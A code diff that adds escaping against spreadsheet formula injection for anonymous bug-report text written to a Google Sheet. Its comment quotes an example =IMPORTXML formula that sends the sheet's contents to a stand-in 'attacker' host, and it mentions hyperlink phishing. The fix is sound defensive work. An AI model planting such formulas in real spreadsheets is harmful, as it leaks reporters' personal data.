@@ -241,6 +241,30 @@ function sheetStr(value: string): string {
 }
 
 /**
+ * Neutralise a formula in a cell whose text came from a reporter.
+ *
+ * Columns A and H are deliberately =HYPERLINK formulas, so this sheet is written
+ * with valueInputOption "USER_ENTERED" - and that setting is per-request, not
+ * per-cell: it makes Sheets parse a leading "=" in EVERY cell of the write,
+ * including the reporter's free text in C and D. POST /api/support/ticket is
+ * open to signed-out visitors on purpose, so that free text is anonymous input.
+ *
+ * Which meant "=IMPORTXML(\"https://attacker/?d=\"&CONCATENATE(A1:J500),\"//a\")"
+ * typed into "What is wrong" executed the moment a triager opened the board,
+ * with every other reporter's name, address and description available to
+ * concatenate into the outbound request. =HYPERLINK was the phishing version of
+ * the same thing, wearing the same styling as the two links we put there.
+ *
+ * A leading apostrophe is the Sheets escape for "treat this as literal text" -
+ * it is not stored in the cell value and does not render. = + - @ are the
+ * formula leaders; a leading tab or CR slips one past a check that only looks
+ * for "=".
+ */
+function sheetText(value: string): string {
+  return /^[=+\-@\t\r]/.test(value) ? `'${value}` : value;
+}
+
+/**
  * Append a new bug as a red row (Status "open", Is issue checked, AI fixed
  * unchecked). Returns the 1-based row number (store in support_tickets.sheet_row),
  * or null if Sheets is unconfigured / failed.
@@ -300,9 +324,9 @@ export async function appendBugRow(input: SheetRowInput): Promise<number | null>
         values: [
           [
             urlCell, // A URL (clickable)
-            input.role, // B Logged in as
-            input.whatIsWrong, // C
-            input.expected, // D
+            sheetText(input.role), // B Logged in as
+            sheetText(input.whatIsWrong), // C - reporter's free text, may be anonymous
+            sheetText(input.expected), // D - reporter's free text, may be anonymous
             true, // E Is issue
             false, // F AI fixed
             "open", // G Status
@@ -361,7 +385,12 @@ export async function updateBugRowContent(
     const sheets = getClient();
     await ensureSheet(sheets);
     const data: sheets_v4.Schema$ValueRange[] = [
-      { range: `${TAB}!C${rowNumber}:D${rowNumber}`, values: [[whatIsWrong, expected]] },
+      // Operator-gated, but the text originates from the anonymous report, so a
+      // stored payload would re-land on every edit without this.
+      {
+        range: `${TAB}!C${rowNumber}:D${rowNumber}`,
+        values: [[sheetText(whatIsWrong), sheetText(expected)]],
+      },
     ];
     if (state) {
       data.push({
@@ -398,7 +427,7 @@ export async function markBugRowNotFixed(
       requestBody: {
         valueInputOption: "USER_ENTERED",
         data: [
-          { range: `${TAB}!C${rowNumber}`, values: [[message]] },
+          { range: `${TAB}!C${rowNumber}`, values: [[sheetText(message)]] },
           { range: `${TAB}!F${rowNumber}:G${rowNumber}`, values: [[false, "open"]] },
         ],
       },
